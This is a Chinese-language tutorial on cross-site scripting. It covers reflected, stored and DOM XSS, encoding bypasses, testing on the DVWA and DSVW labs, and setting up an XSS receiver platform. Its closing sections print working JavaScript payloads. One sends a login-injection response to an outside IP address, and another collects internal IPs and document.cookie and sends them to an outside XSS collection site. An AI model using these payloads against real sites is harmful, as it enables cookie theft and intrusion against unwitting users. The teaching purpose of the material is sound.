本文由红日安全成员： Aixic 编写，如有不当，还望斧正。
大家好，我们是 **红日安全-Web安全攻防小组** 。此项目是关于Web安全的系列文章分享，还包含一个HTB靶场供大家练习，我们给这个项目起了一个名字叫
[Web安全实战](https://github.com/hongriSec/Web-Security-Attack)
，希望对想要学习Web安全的朋友们有所帮助。每一篇文章都是于基于 **漏洞简介-漏洞原理-漏洞危害-测试方法（手工测试，工具测试）-靶场测试（分为PHP靶场、JAVA靶场、Python靶场基本上三种靶场全部涵盖）-实战演练**
（主要选择相应CMS或者是Vulnhub进行实战演练)，如果对大家有帮助请 **Star**
鼓励我们创作更好文章。如果你愿意加入我们，一起完善这个项目，欢迎通过邮件形式（PI:EMAIL）联系我们。
# 1.XSS漏洞概述
## 1.1 漏洞简介
跨站脚本攻击—XSS（Cross Site
Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。
## 1.2 XSS漏洞原理
### 1.2.1 反射型
非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS  
主要是GET类型
### 1.2.2 存储型
持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。  
例如：`alert(/xss/)`
### 1.2.3 DOM型
DOM型是特殊的反射型XSS  
在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document
object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。
## 1.3 XSS危害
### 1.3.1 盗取管理员cookie
盗取管理员的cookie然后登陆后台，获取到后台权限。
### 1.3.2 XSS蠕虫攻击
可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用
## 1.4 常用XSS语句
     //经典语句
## 1.5 XSS漏洞绕过
### 1.5.1 JS编码
三个八进制数；如果不够前面补0  
两个十六进制数字；如果不够前面补0  
四个十六进制数字；如果不够前面补0  
控制字符
### 1.5.2 HTML实体编码
以`&`开始`;`结束
### 1.5.3 URL编码
%27  
考虑HTML的渲染方式选择合适的编码方式进行测试
## 1.6 XSS漏洞浏览器问题
有些浏览器会过滤掉一些js脚本，在测试的时候需要关闭对JavaScript的检测。
## 0x06 XSS漏洞防御
过滤输入的数据，和非法字符`‘ “  on* 等”’`  
输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等
# 2\. 测试方法
## 2.1 手工测试
这里我们选取DVWA靶场进行手工测试。
### 2.1.1
### 2.1.1.1 DVWA 简介
DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。
#### 2.1.1.2 DVWA 安装
    https://github.com/ethicalhack3r/DVWA/archive/master.zip
本地PHPStudy搭建DVWA靶机，放入www目录下即可  
环境使用PHP+MySQL即可。
修改config.inc.php.dist配置文件中的数据库密码，并且把文件后缀.dist去掉  
因为是xss实验，所以上面的红字可无视，重置一下数据库进入靶场  
用户名:admin 密码:password 登陆靶场  
默认的难度是impossible级别，先选择low级别  
#### 2.1.1.3 测试过程
**Low**  
**Low_DOM XSS**  
用``即可触发XSS  
**Low_Reflected XSS**  
直接使用``  
**Low_Stored XSS**  
**Medium**  
**Medium_DOM XSS**  
从Medium级别就开始有加固  
可以看到它先判断default是否为空，如果不为空，判断下面判断GET输入进来的变量default是否存在`
**Medium_Reflected XSS**  
分析发现现实判断是否为空，如果不为空再判断其中的内容如果有``就替换成空复写就可以绕过
**High_Stored XSS**  
跟上面同理，在name处进行xss，仍然需要改name长度  
**Impossible**  
Impossible级别利用失败  
## 无敌防御方法使用htmlspecialchars函数对输入的数据实例化，失去本身作用。
### 2.1.2 DSVW
#### 2.1.2.1 DSVW 简介
Damn Small Vulnerable Web (DSVW) 是使用 Python 语言开发的 Web应用漏洞 的演练系统。其系统只有一个 python
的脚本文件组成, 当中涵盖了 26 种 Web应用漏洞环境, 并且脚本代码行数控制在了100行以内, 当前版本v0.1m。需要python (2.6.x 或
2.7)并且得安装lxml库
#### 2.1.2.2 DSVW 安装
安装python-lxml，再下载DSVW
    apt-get install python-lxml
    git clone https://github.com/stamparm/DSVW.git
直接运行  
如果出现ip无法访问的情况改一下代码即可  
#### 2.1.2.3 测试过程
**XSS(Reflected)**  
因为这个网站没有cookie，所以直接弹射信息  
代码``  
**XSS(Stored)**  
代码``  
直接弹射
**XSS(DOM)**  
?##lang=``  
直接弹射
**XSS(JSON)**  
看代码可发现  
构造语句alert(/xss/)即可不用带script  
## 2.2 工具测试
因为要测试所以需要关闭DVWA的登陆验证  
加上$dvwaSession[ 'username' ]='admin';  
在config/config.inc.php把默认难度也改成low  
### 2.2.1 BruteXSS
下载链接
    https://github.com/ym2011/penetration/tree/master/BruteXSS
测试过程中会因为DVWA的cookie验证严格出现问题，把dvwa的代码进行本地测试利用即可  
### 2.2.2 xxser
Kali自带或下载链接
    在基于Debian的系统上安装
    sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip 使用
利用成功
## 2.3 XSS平台搭建
### 2.3.1 平台介绍
XSS平台可以辅助安全测试人员对XSS相关的漏洞危害进行深入学习，了解XSS的危害重视XSS的危害，如果要说XSS可以做哪些事情，XSS可以做js能够做的所有事情。包括但不限于：窃取Cookie、后台增删改文章、钓鱼、利用XSS漏洞进行传播、修改网页代码、网站重定向、获取用户信息（如浏览器信息，IP地址等）等。  
XSS平台项目名称：BlueLotus_XSSReceiver  
作者：firesun（来自清华大学蓝莲花战队）  
项目地址：
### 2.3.2 平台环境
服务器操作系统：ubuntu14  
web容器：Apache2  
脚本语言：PHP7  
安装http server与php环境（ubuntu: sudo apt-get install apache2 php5 或 sudo apt-get
install apache2 php7.0 libapache2-mod-php7.0）
### 2.3.3 平台部署
文件解压到www根目录  
然后给个权限，为了防止出错  
权限的问题已经解决了  
打开网页访问admin.php进行自动部署，点击安装  
设置一下后台登陆密码  
点击下一步，部署成功
### 2.3.4 平台使用
登陆平台，在公共模版处使用默认js来进行  
修改一下网站的地址  
改成这样即可  
点击下面的修改即可成功应用  
下面开始使用这个默认的JS脚本进行XSS，复制一下js地址`https://aixic.cn/XXXSSS/template/default.js`  
在DVWA中插入试试
能成功反射cookie
### 2.3.5 平台扩展
#### 2.3.5.1 XSS平台反射注入
介绍一个之前在比赛看见有个师傅玩的操作，用xss进行内网SQL注入。ps:虽然他x错地方了而且跟注入没关系，但是看着挺好玩的，进行了一个简单的布尔判断xss
    xmlhttp=new XMLHttpRequest();
    var d1=new Date();
    t1=d1.getTime();
    xmlhttp.onreadystatechange=function(){
    if(xmlhttp.readyState==4 && xmlhttp.status==200){
    var d2=new Date();
    t2=d2.getTime();
    location.href="http://123.207.99.17/id1?xssaaaa"+escape(xmlhttp.responseText)+"timeCost"+String(t2-t1);
    }
    }
    xmlhttp.open("POST","/Ze02pQYLf5gGNyMn/login.php",true);
    xmlhttp.send("username=admi/**/or/**/1&password=1");
#### 2.3.5.2 使用邮件提醒
设置一下config.php里的与邮件相关的
### 直接去别的XSS平台去扒他们的脚本，拿来就能用
如这个获取内网IP的脚本
    var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
    if (RTCPeerConnection) (function() {
        var rtc = new RTCPeerConnection({
            iceServers:[]
        });
        if (1 || window.mozRTCPeerConnection) {
            rtc.createDataChannel("", {
                reliable:false
            });
        }
        rtc.onicecandidate = function(evt) {
            if (evt.candidate) grepSDP("a=" + evt.candidate.candidate);
        };
        rtc.createOffer(function(offerDesc) {
            grepSDP(offerDesc.sdp);
            rtc.setLocalDescription(offerDesc);
        }, function(e) {
            console.warn("offer failed", e);
        });
        var addrs = Object.create(null);
        addrs["0.0.0.0"] = false;
        function updateDisplay(newAddr) {
            if (newAddr in addrs) return; else addrs[newAddr] = true;
            var displayAddrs = Object.keys(addrs).filter(function(k) {
                return addrs[k];
            });
    new Image().src="https://xsshs.cn/xss.php?do=selfxss&act=g&id={projectId}&c=!!!cookie:"+document.cookie+"!!!ip:"+String(displayAddrs);
        }
        function grepSDP(sdp) {
            var hosts = [];
            sdp.split("\r\n").forEach(function(line) {
                if (~line.indexOf("a=candidate")) {
                    var parts = line.split(" "), addr = parts[4], type = parts[7];
                    if (type === "host") updateDisplay(addr);
                } else if (~line.indexOf("c=")) {
                    var parts = line.split(" "), addr = parts[2];
                    updateDisplay(addr);
                }
            });
        }
    })();
获取页面源码的脚本
    var cr;
    if (document.charset) {
      cr = document.charset
    } else if (document.characterSet) {
      cr = document.characterSet
    };